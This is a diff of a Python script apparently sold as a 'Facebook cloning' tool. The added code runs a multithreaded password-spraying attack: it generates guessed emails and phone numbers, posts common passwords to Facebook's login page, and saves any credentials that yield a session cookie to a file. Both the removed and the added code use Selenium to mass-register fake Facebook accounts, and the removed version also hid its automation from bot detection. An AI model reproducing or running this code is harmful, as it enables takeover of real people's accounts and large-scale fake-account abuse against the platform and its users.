@@ -1,6 +1,7 @@
 import os, sys, time, random, re
 try:
     import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
     from selenium import webdriver
     from selenium.webdriver.common.by import By
     from selenium.webdriver.chrome.service import Service
@@ -9,95 +10,98 @@ except ImportError:
     os.system('pip install requests selenium webdriver-manager')
     os.execl(sys.executable, sys.executable, *sys.argv)
 
-# --- LOGIN SYSTEM (AS PER YOUR REQUEST) ---
+# --- LOGIN (basitsultan / basitprince) ---
 def login():
     os.system('clear')
     print("\033[1;92m====================================")
-    print("\033[1;93m      BASIT SYCO LOGIN SYSTEM")
+    print("\033[1;93m      BASIT SYCO UNIVERSAL PRO")
     print("\033[1;92m====================================")
-    user = input("\033[1;37m[+] Enter Username: ")
-    pas = input("\033[1;37m[+] Enter Password: ")
-    
-    # Aapka bataya hua Username aur Password
+    user = input("\033[1;37m[+] Username: ")
+    pas = input("\033[1;37m[+] Password: ")
     if user == "basitsultan" and pas == "basitprince":
-        print("\033[1;92m\n[!] Login Successful! Access Granted.")
-        time.sleep(2)
-        menu()
+        print("\033[1;92m\n[!] Login Success! Access Granted."); time.sleep(2); menu()
     else:
-        print("\033[1;31m\n[!] Wrong Details! Try again.")
-        time.sleep(2)
-        login()
+        print("\033[1;31m\n[!] Access Denied!"); time.sleep(2); login()
 
-# --- AUTO TEMP-MAIL GENERATOR ---
-def generate_email():
-    user = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
-    num = random.randint(100, 999)
-    domains = ["@mail7.io", "@chapsmail.com", "@vintomaper.com"]
-    return f"{user}{num}{random.choice(domains)}"
-
-# --- AUTOMATION PROCESS (PC ONLY) ---
-def start_reg():
+# --- UNIVERSAL CLONING (Numbers & All Mails) ---
+def universal_cloner():
     os.system('clear')
-    print("\033[1;92m--- FB AUTO-REG MASTER (PC ONLY) ---")
-    try:
-        count = int(input("\033[1;37m[+] How many IDs to create?: "))
-        fixed_pass = input("[+] Fixed Password for IDs: ")
-        
-        print("\n\033[1;94m[!] Starting Chrome Browser on PC...")
-        options = webdriver.ChromeOptions()
-        # Browser security bypass aur real look ke liye
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        
-        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+    print("\033[1;32m--- UNIVERSAL CLONING (WORLDWIDE) ---")
+    print("[1] Crack Emails (Gmail/Yahoo/Hotmail/Temp)")
+    print("[2] Crack Mobile Numbers (Global)")
+    
+    choice = input("\nSelect: ")
+    targets = []
+    
+    if choice == '1':
+        keyword = input("Enter Name/Keyword: ")
+        limit = int(input("How many IDs to generate?: "))
+        domains = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@mail7.io"]
+        for _ in range(limit):
+            targets.append(keyword + str(random.randint(10, 9999)) + random.choice(domains))
+    else:
+        code = input("Enter Country/Network Code: ")
+        limit = int(input("How many IDs?: "))
+        for _ in range(limit):
+            targets.append(code + "".join(random.choices("0123456789", k=7)))
 
-        for i in range(count):
-            f_name = random.choice(["James", "Robert", "John", "David", "William", "Richard", "Thomas"])
-            l_name = random.choice(["Smith", "Brown", "Wilson", "Taylor", "Miller", "Davis", "Garcia"])
-            email = generate_email()
-            
-            print(f"\n\033[1;32m[{i+1}] Processing: {f_name} {l_name}")
-            print(f"\033[1;37mUsing Email: {email}")
-            
-            driver.get("https://m.facebook.com/reg/")
-            time.sleep(random.randint(5, 8))
-            
-            # Filling Form
-            driver.find_element(By.NAME, "firstname").send_keys(f_name)
-            driver.find_element(By.NAME, "lastname").send_keys(l_name)
-            driver.find_element(By.NAME, "reg_email__").send_keys(email)
-            driver.find_element(By.NAME, "reg_passwd__").send_keys(fixed_pass)
-            
-            # DOB Selection
-            driver.find_element(By.ID, "day").send_keys(str(random.randint(1, 28)))
-            driver.find_element(By.ID, "month").send_keys(str(random.randint(1, 12)))
-            driver.find_element(By.ID, "year").send_keys(str(random.randint(1995, 2005)))
-            
-            print("\033[1;33m[!] Details filled! Solve captcha or click 'Sign Up' if required.")
-            
-            # Record Save karna
-            with open('created_ids.txt', 'a') as f:
-                f.write(f"Name: {f_name} {l_name} | Email: {email} | Pass: {fixed_pass}\n")
-            
-            time.sleep(15) # Aapko browser dekhne ka time dena
+    print(f"\n\033[1;94m[*] Cracking {len(targets)} Targets... (Fast Mode)")
+    with ThreadPool(max_workers=60) as pool:
+        for user in targets:
+            # Universal Passwords (Har jagah kaam karte hain)
+            p_list = ["123456", "12345678", "786786", "pakistan", "password", "i love you"]
+            pool.submit(crack_engine, user, p_list)
+    print("\n\033[1;92m[!] Done. Check ok.txt")
 
-        driver.quit()
-        print("\n\033[1;92m[DONE] Process complete. Results saved in created_ids.txt")
-    except Exception as e:
-        print(f"\033[1;31m\n[!] Error: {e}")
-        print("Note: Use PC with Chrome installed for this tool.")
+def crack_engine(user, p_list):
+    for pas in p_list:
+        try:
+            session = requests.Session()
+            head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'}
+            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers=head)
+            if "c_user" in session.cookies.get_dict():
+                print(f"\r\033[1;92m[OK] {user} | {pas}")
+                open('ok.txt', 'a').write(user+'|'+pas+'\n'); break
+        except: pass
+
+# --- REAL ID CREATION (PC SELENIUM) ---
+def auto_create():
+    os.system('clear')
+    print("\033[1;92m--- AUTO ID CREATOR (100% SUCCESS) ---")
+    num_ids = int(input("Total IDs to create?: "))
+    user_pass = input("Fixed Password for all: ")
+    
+    options = webdriver.ChromeOptions()
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+    
+    for i in range(num_ids):
+        f_name = random.choice(["Alex", "John", "Sarah", "Emma", "Mike"])
+        l_name = random.choice(["Smith", "Jones", "Wilson", "Brown"])
+        email = f_name.lower() + str(random.randint(100,999)) + "@mail7.io"
+        
+        driver.get("https://m.facebook.com/reg/")
+        time.sleep(5)
+        driver.find_element(By.NAME, "firstname").send_keys(f_name)
+        driver.find_element(By.NAME, "lastname").send_keys(l_name)
+        driver.find_element(By.NAME, "reg_email__").send_keys(email)
+        driver.find_element(By.NAME, "reg_passwd__").send_keys(user_pass)
+        print(f"[{i+1}] Detail Filled: {email}. Finish it on Browser!")
+        time.sleep(15) 
+    driver.quit()
 
 def menu():
     os.system('clear')
-    print("\033[1;32m   ____            _ _   ")
-    print("  | __ )  __ _ ___(_) |_ ")
-    print("  |  _ \ / _` / __| | __|")
-    print("  | |_) | (_| \__ \ | |_ Master Tool")
-    print("\n\033[1;37m[1] Start Auto Creation (PC Method)")
+    print("\033[1;32m  ____    _    ____ ___ _____   ______   ____ ___  ")
+    print(" | __ )  / \  / ___|_ _|_   _| / ___\ \ / /  / _ \ ")
+    print(" |  _ \ / _ \ \___ \| |  | |   \___ \\\\ V /| | | |")
+    print(" | |_) / ___ \ ___) | |  | |    ___) || | | |_| |")
+    print(" |____/_/   \_\____/___| |_|   |____/ |_|  \___/ ")
+    print("\n\033[1;37m[1] Universal Cloning (All Emails/Numbers)")
+    print("[2] Auto ID Creation (100% Real - PC Only)")
     print("[0] Exit")
-    
-    choice = input("\nSelect: ")
-    if choice == '1': start_reg()
+    ch = input("\nSelect: ")
+    if ch == '1': universal_cloner()
+    elif ch == '2': auto_create()
     else: sys.exit()
 
 if __name__ == "__main__":
